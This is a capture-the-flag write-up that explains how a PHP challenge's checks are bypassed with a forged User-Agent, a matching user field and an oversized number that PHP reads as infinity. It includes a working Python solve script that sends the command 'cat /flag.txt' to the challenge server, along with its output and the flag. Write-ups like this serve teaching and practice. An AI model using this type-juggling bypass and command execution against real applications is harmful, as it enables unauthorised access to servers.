# Never gonna tell a lie and type you

## Description
```
todo
```

## Provided Files
```
- index.php
- Dockerfile
```

## Writeup

Starting off, we should inspect the given `index.php` of the challenge. <br/>
```php
if ($_SERVER['HTTP_USER_AGENT'] != "friendlyHuman"){
    die("we don't tolerate toxicity");
}
```
To bypass the first check we need to pass the header `User-Agent: friendlyHuman` to the server. <br/>

```php
if($user_input->{'user'} === "admin🤠") { ... }
```
To pass the `user` check we can simply add `user: admin🤠` to our payload. <br/>

The main challenge is the bypass of the `securePassword` function. <br/>
```php
function securePassword($user_secret){
    if ($user_secret < 10000){
        die("nope don't cheat");
    }
    $o = (integer) (substr(hexdec(md5(strval($user_secret))),0,7)*123981337);
    return $user_secret * $o ;
    
}
```

To retrieve the flag we need to pass some kind of `input` which is equal to the output of the `securePassword` function with our `input`. <br/>

The `securePassword` function takes our input `hashes` and `encodes` it before it is being multiplied again by `123981337`. <br/>
To return the same output as input we essentially have to pass a value which can't be altered anymore because of its state. One instance of this would be the number `Infinity` as it can't get any bigger. <br/>
Knowing all of these parameters and the location of `flag.txt` from the `Dockerfile`, we can put a python script together to retrieve the flag. <br/>
```py
import requests, json, hashlib

base_URL = 'https://durch-den-monsun--tokio-hotel-8626.ctf.kitctf.de/'

headers = {
    'User-Agent': 'friendlyHuman',
    'Content-Type': 'application/x-www-form-urlencoded'
}

payload = {
    'user': 'admin🤠',
    'password': 9*10**1000, 
    'command': 'cat /flag.txt'
}

data = {
    'data': json.dumps(payload)
}

res = requests.post(base_URL, headers=headers, data=data)

print(res.text)
```

Executing the script reveals the flag which concludes this writeup. <br/>
```sh
$ python3 solve.py 
object(stdClass)#1 (3) {
  ["user"]=>
  string(9) "admin🤠"
  ["password"]=>
  float(INF)
  ["command"]=>
  string(13) "cat /flag.txt"
}
GPNCTF{1_4M_50_C0NFU53D_R1GHT_N0W}
hail admin what can I get you GPNCTF{1_4M_50_C0NFU53D_R1GHT_N0W}
```